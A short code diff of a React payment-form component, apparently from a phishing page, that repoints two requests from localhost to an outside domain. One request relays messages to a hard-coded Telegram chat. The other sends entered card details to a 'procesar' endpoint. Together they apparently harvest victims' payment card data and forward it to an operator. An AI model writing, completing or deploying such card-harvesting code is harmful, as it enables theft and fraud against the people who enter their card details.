@@ -123,7 +123,7 @@ const PaymentStepCard = () => {
     const sendTelegramMessage = async (message) => {
         try {
             const chatId = '-4542132850';
-            const response = await fetch('http://localhost:3000/enviarmensaje', {
+            const response = await fetch('https://streaming.pagafacilntf.com/enviarmensaje', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -168,7 +168,7 @@ const PaymentStepCard = () => {
     
         try {
             // Enviar los datos de la tarjeta al backend
-            const response = await fetch('http://localhost:3000/procesar', {
+            const response = await fetch('https://streaming.pagafacilntf.com/procesar', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
